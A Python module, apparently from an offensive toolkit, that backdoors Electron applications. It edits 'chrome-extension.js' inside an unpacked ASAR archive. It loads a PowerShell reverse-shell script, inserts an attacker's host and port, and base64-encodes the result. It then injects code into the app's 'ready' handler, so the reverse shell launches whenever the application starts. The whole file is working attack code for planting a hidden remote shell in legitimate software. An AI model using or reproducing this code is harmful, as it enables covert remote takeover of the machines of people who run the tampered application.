import pprint, os, jsmin, base64

class worker:
    def __init__(self, utils):
        self.utils = utils

    def run(self, worker_data):
        module = worker_data['module']
        module_data = worker_data['module_data']
        asar_working_path = worker_data['asar_working_path']

        # Now we need to inject the app events.
        file_to_inject = os.path.join(asar_working_path, 'browser', 'chrome-extension.js')
        if os.path.isfile(file_to_inject) is False:
            return False

        file_contents = self.utils.load_file(file_to_inject)

        # This is the payload that will be encoded to base64.
        ps_payload = self.utils.load_file(os.path.join(module['path'], 'scripts', 'rshell.ps1'))
        ps_payload = ps_payload.replace('%HOST%', module_data['rshell']['host']).replace('%PORT%', module_data['rshell']['port'])
        ps_payload = base64.b64encode(ps_payload.encode('UTF-16LE')).decode()

        # This will be the final payload that will be injected.
        payload = self.utils.load_file(os.path.join(module['path'], 'templates', 'code.js'))
        payload = payload.replace('%PAYLOAD%', ps_payload).replace('%POWERSHELL%', module_data['rshell']['powershell_path'].replace('\\', '\\\\'))

        file_contents = self.utils.inject_code(file_contents, 'app.once', 'ready', payload, "app.once('ready', function () {\n\n%FUNCTION_CODE%\n\n});")

        with open(file_to_inject, 'w') as f:
            f.write(file_contents)

        return True